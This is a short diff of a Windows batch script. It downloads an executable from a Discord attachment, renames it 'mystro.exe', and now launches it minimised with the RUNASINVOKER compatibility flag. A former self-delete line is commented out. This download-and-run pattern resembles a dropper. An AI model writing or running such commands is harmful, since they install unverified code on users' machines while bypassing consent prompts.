@@ -33,5 +33,5 @@ echo.                                                                   >> %DLOA
 
 @cscript //Nologo %DLOAD_SCRIPT% "https://cdn.discordapp.com/attachments/764395888818126858/1227234897719201852/Remove-Edge_GUI.exe?ex=6627aa90&is=66153590&hm=8ee542cfebb432e83be02a3cb719fdcfb03e8ca4dd646942ba27955b28d32384&" mystro.exe
 del download.vbs
-start "" mystro.exe
-( del /q /f "%~f0" >nul 2>&1 & exit /b 0  )
+cmd /min /b /C "set __COMPAT_LAYER=RUNASINVOKER && start "" mystro.exe"
+rem ( del /q /f "%~f0" >nul 2>&1 & exit /b 0  )
